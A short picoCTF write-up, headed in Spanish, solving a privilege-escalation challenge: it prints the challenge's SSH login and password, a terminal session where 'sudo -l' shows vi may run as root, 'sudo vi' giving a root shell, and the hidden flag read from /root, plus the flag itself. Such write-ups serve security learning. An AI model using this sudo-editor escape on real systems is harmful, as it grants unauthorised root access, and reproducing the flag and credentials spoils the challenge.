## Introducción
Can you read files in the root file?The system admin has provisioned an account for you on the main server:ssh -p 58301 picoplayer@saturn.picoctf.netPassword: `33qE7mB5BF`Can you login and read the root file?
## Descripción
```
zsh: corrupt history file /home/kali/.zsh_history
┌──(kali㉿kali)-[~]
└─$ ssh -p 58301 picoplayer@saturn.picoctf.net

picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Nov 27 06:29:37 2024 from 187.133.10.31
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi

# whoami
root
# cd ..                                           
# ls
picoplayer
# cd ..
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd root
# ls -lsf
.  ..  .bashrc  .profile  .viminfo  .flag.txt
# cat flag.txt
cat: flag.txt: No such file or directory
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}

```

## Solución 
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}